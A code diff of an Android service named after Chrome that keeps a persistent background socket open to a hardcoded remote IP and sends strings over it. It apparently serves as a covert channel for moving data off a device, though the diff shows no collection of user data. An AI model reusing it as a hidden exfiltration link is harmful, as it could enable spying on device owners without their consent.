@@ -3,87 +3,77 @@ package com.example.asa.chrometextension;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.icu.util.Output;
 import android.os.IBinder;
 import android.util.Log;
-
-import java.io.BufferedReader;
-import java.io.BufferedWriter;
-import java.io.FileWriter;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
-import java.util.Timer;
-import java.util.TimerTask;
 
 public class Chrome_TExtension_Service extends Service {
     //Log tag
-    private static final String LOG_TAG = "TExtension_Service";
+    private static final String LOG_TAG = Chrome_TExtension_Service.class.getSimpleName();
     //The socket we'll be opening to connect to our server
-    private Socket socket = null;
+    private static Socket socket;
+    //Our printwriter for writing to our socket
+    static PrintWriter socket_writer;
     //Our Server information
-    final String IP = "159.203.25.93";
-    final int PORT = 1026;
-
+    final static String IP = "159.203.25.93";
+    final static int PORT = 1026;
+    private static Chrome_TExtension_Service single_service;
+    public Chrome_TExtension_Service() {
+        if (socket == null) openConnection();
+    }
+    public static Chrome_TExtension_Service getInstance(){
+        if (single_service == null) single_service = new Chrome_TExtension_Service();
+        return single_service;
+    }
     @Override
     public int onStartCommand(Intent intent, int flags, int startID){
-        final Context context = this;
-        new Thread() {
-            @Override
-            public void run() {
-                connectToServer();
-                writeToServer("Hey bb");
-                closeConnection();
-            }
-        }.start();
-        //Starts a new thread for network-connections
         return START_STICKY;
     }
     //Writes to the socket we've connected to.
-    private void writeToServer(String s){
-        if (socket==null) {
-           Log.e(LOG_TAG,"Not connected to the server, connect first!");
-           return;
+    protected void writeToServer(final String s){
+        while(socket_writer == null){
+            try {Thread.sleep(10);}catch (Exception e){ }
         }
-        OutputStream out;
-        try{
-            out = socket.getOutputStream();
-
-        } catch (IOException e){
-            Log.e(LOG_TAG, "IOException when getting socket's OutputStream: " + e.getMessage());
-            return;
-        }
-        PrintWriter writer = new PrintWriter(out,true);
-        writer.println(s);
-        writer.close();
+        new Thread(){
+            @Override
+            public void run(){
+                socket_writer.println(s);
+            }
+        }.start();
     }
     //Opens a socket to our server
-    private void connectToServer(){
-        try {
-            InetAddress IA = InetAddress.getByName(IP);
-            socket = new Socket(IA,PORT);
-        } catch (UnknownHostException e) {
-            Log.e(LOG_TAG, "UnknownHostException when attempting to create a socket: " + e.getMessage());
-        } catch (IOException e) {
-            Log.e(LOG_TAG, "IO Exception when attempting to create a socket: " + e.getMessage());
-        }
+    private void openConnection(){
+        new Thread(){
+            @Override
+            public void run(){
+                try {
+                    InetAddress IA = InetAddress.getByName(IP);
+                    socket = new Socket(IA,PORT);
+                    OutputStream out = socket.getOutputStream();
+                    socket_writer = new PrintWriter(out,true);
+                } catch (UnknownHostException e) {
+                    Log.e(LOG_TAG, "UnknownHostException when attempting to create a socket: " + e.getMessage());
+                } catch (IOException e) {
+                    Log.e(LOG_TAG, "IO Exception when attempting to create a socket: " + e.getMessage());
+                }
+            }
+        }.start();
     }
-
-    //Closes socket
+    //Closes socket and our PrintWriter
     private void closeConnection(){
         try {
             socket.close();
         } catch (IOException e){
-            Log.e(LOG_TAG, "Couldn't close the socket : " + e.getMessage());
+             Log.e(LOG_TAG, "Couldn't close the socket : " + e.getMessage());
         }
+        if (socket_writer != null) socket_writer.close();
     }
-
-
-
 
     @Override
     public IBinder onBind(Intent intent) {
